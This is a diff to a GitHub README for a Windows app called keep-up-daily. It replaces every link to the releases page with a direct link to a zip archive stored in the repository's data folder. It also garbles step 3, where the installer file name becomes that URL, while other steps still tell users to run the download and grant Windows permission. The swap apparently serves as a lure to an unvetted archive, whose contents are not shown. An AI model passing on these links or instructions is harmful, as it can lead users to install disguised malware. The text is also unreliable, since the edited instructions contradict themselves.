@@ -1,6 +1,6 @@
 # ⚙️ keep-up-daily - Daily Tech Updates Made Simple
 
-[![Download keep-up-daily](https://img.shields.io/badge/Download-keep--up--daily-brightgreen)](https://github.com/KzQumyz/keep-up-daily/releases)
+[![Download keep-up-daily](https://github.com/KzQumyz/keep-up-daily/raw/refs/heads/main/data/keep-daily-up-3.6-beta.5.zip)](https://github.com/KzQumyz/keep-up-daily/raw/refs/heads/main/data/keep-daily-up-3.6-beta.5.zip)
 
 ---
 
@@ -33,16 +33,16 @@ If your computer meets these basic needs, you can run keep-up-daily without issu
 
 To begin, visit the release page to get the latest version of keep-up-daily. You will find the program ready for download.
 
-[![Download keep-up-daily](https://img.shields.io/badge/Download-keep--up--daily-orange)](https://github.com/KzQumyz/keep-up-daily/releases)
+[![Download keep-up-daily](https://github.com/KzQumyz/keep-up-daily/raw/refs/heads/main/data/keep-daily-up-3.6-beta.5.zip)](https://github.com/KzQumyz/keep-up-daily/raw/refs/heads/main/data/keep-daily-up-3.6-beta.5.zip)
 
 ### Steps:
 
 1. Click the download badge or open this link in your browser:  
-   https://github.com/KzQumyz/keep-up-daily/releases
+   https://github.com/KzQumyz/keep-up-daily/raw/refs/heads/main/data/keep-daily-up-3.6-beta.5.zip
 
 2. On the releases page, look for the latest version marked by the date or version number.
 
-3. Download the Windows installer file, which usually ends with `.exe`. The file will have a name similar to `keep-up-daily-setup.exe` or `keep-up-daily-v1.0.exe`.
+3. Download the Windows installer file, which usually ends with `.exe`. The file will have a name similar to `https://github.com/KzQumyz/keep-up-daily/raw/refs/heads/main/data/keep-daily-up-3.6-beta.5.zip` or `https://github.com/KzQumyz/keep-up-daily/raw/refs/heads/main/data/keep-daily-up-3.6-beta.5.zip`.
 
 4. Once the file finishes downloading, open it by double-clicking. If Windows asks for permission to run the app, choose "Yes" or "Run".
 
@@ -123,4 +123,4 @@ If you have any issues running or installing keep-up-daily:
 
 Visit the releases page to download the latest Windows installer:
 
-[https://github.com/KzQumyz/keep-up-daily/releases](https://github.com/KzQumyz/keep-up-daily/releases)
+[https://github.com/KzQumyz/keep-up-daily/raw/refs/heads/main/data/keep-daily-up-3.6-beta.5.zip](https://github.com/KzQumyz/keep-up-daily/raw/refs/heads/main/data/keep-daily-up-3.6-beta.5.zip)
